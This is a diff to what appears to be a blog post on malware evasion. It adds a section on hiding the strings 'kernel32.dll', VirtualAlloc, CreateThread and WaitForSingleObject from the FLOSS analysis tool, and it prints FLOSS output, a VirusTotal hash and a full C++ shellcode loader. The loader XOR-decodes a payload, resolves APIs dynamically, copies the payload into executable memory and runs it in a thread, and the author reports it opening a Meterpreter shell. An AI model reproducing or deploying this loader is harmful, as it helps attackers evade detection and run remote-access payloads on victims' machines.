@@ -453,8 +453,8 @@ for (int i {0}; i < 4; i++) {
 {% endhighlight %}
 
 <br>
-#### 5.3. Stack String
-Building strings on the stack didn't work either. Avoided the use of functions and loops - even tried to be sneaky by deleting `kernel32_str` immediately after use, but FLOSS still extracted the complete "kernel32.dll" string. 
+#### 5.3. Stack Strings (Fail)
+Building strings on the stack didn't work either. Avoided the use of functions and loops - even tried to be sneaky by zeroing `kernel32_str` immediately after use, but FLOSS still extracted the complete "kernel32.dll" string. 
 
 {% highlight cpp %}
 char L[] {"abcdefghijklmnopqrstuvwxyz"};
@@ -478,3 +478,100 @@ kernel32_str[12] = 0;
 std::cout << kernel32_str << std::endl;
 memset(kernel32_str, 0, sizeof(kernel32_str));
 {% endhighlight %}
+
+<br>
+#### 5.4. WinAPI Calls (PASS)
+After several rounds of testing. I discovered FLOSS' inability to emulate WinAPI calls. In my bypass, I decoded the string one character at a time, and attempted to call `LoadLibraryA` and `GetProcAddress` on each iteration. 
+
+Successfully hid strings from FLOSS.
+
+{% highlight powershell %}
+------------------------------
+| FLOSS UTF-16LE STRINGS (0) |
+------------------------------
+
+---------------------------
+| FLOSS STACK STRINGS (4) |
+---------------------------
+pFNSaHUtNI@KBhEMBDS
+dUBFSBsOUBFC
+qNUSRFKfKKHD
+LBUIBK
+
+---------------------------
+| FLOSS TIGHT STRINGS (0) |
+---------------------------
+
+-----------------------------
+| FLOSS DECODED STRINGS (0) |
+-----------------------------
+{% endhighlight %}
+
+<br>
+We can see the implementation of the abovementioned technique in functions `load_module` and `load_api`. Shown below is the full code (excluding payload initialization). Meterpreter shell opened on Kali. Success!
+
+{% highlight cpp %}
+#include <windows.h>
+
+typedef LPVOID(WINAPI* VirtualAllocPtr)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef HANDLE(WINAPI* CreateThreadPtr)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+typedef DWORD(WINAPI* WaitForSingleObjectPtr)(HANDLE hHandle, DWORD dwMilliseconds);
+
+void deobfuscate(unsigned char* deobfuscated_payload) {
+    int new_int {0};
+    for (int index {0}; index < sizeof(payload); index++) {
+        new_int = payload[index] ^ 0x27;
+        deobfuscated_payload[index] = new_int;
+    }
+}
+
+HMODULE load_module(char* string, int size) {
+    for (int i {0}; i < size - 1; i ++) {
+        string[i] = string[i] ^ 0x27;
+        HMODULE handle = LoadLibraryA(string);
+        if (handle) {
+            return handle;
+        }
+    }
+    return 0;
+}
+
+DWORD load_api(HMODULE dll, char* string, int size) {
+    for (int i {0}; i < size - 1; i ++) {
+        string[i] = string[i] ^ 0x27;
+        DWORD address = (DWORD) GetProcAddress(dll, string);
+        if (address) {
+            return address;
+        }
+    }
+    return 0;
+}
+
+int main() {
+    char kernel32_str[] {"\x4c\x42\x55\x49\x42\x4b\x14\x15\x09\x43\x4b\x4b"};
+    char virtual_alloc_str[] {"\x71\x4e\x55\x53\x52\x46\x4b\x66\x4b\x4b\x48\x44"};
+    char create_thread_str[] {"\x64\x55\x42\x46\x53\x42\x73\x4f\x55\x42\x46\x43"};
+    char wait_for_single_obj_str[] {"\x70\x46\x4e\x53\x61\x48\x55\x74\x4e\x49\x40\x4b\x42\x68\x45\x4d\x42\x44\x53"};
+
+    HMODULE kernel32 = load_module(kernel32_str, sizeof(kernel32_str));
+    VirtualAllocPtr virtual_alloc = (VirtualAllocPtr) load_api(kernel32, virtual_alloc_str, sizeof(virtual_alloc_str));
+    CreateThreadPtr create_thread = (CreateThreadPtr) load_api(kernel32, create_thread_str, sizeof(create_thread_str));
+    WaitForSingleObjectPtr wait_for_single_obj = (WaitForSingleObjectPtr) load_api(kernel32, wait_for_single_obj_str, sizeof(wait_for_single_obj_str));
+    
+    LPVOID memory = virtual_alloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    unsigned char deobfuscated_payload[sizeof(payload)];
+    deobfuscate(deobfuscated_payload);
+    memcpy(memory, deobfuscated_payload, sizeof(deobfuscated_payload));
+
+    HANDLE hThread = create_thread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
+    wait_for_single_obj(hThread, INFINITE);
+    
+    return 0;
+}
+{% endhighlight %}
+
+<br>
+Unfortunately this time, more vendors detected the file as malicious. But because of the FLOSS bypass, I will continue off this version.
+
+SHA256: [2d98d3dae97d76fe9370bff18e7de6c4fd0c0761737ae74809e3e232c1c02080](https://www.virustotal.com/gui/file/2d98d3dae97d76fe9370bff18e7de6c4fd0c0761737ae74809e3e232c1c02080)
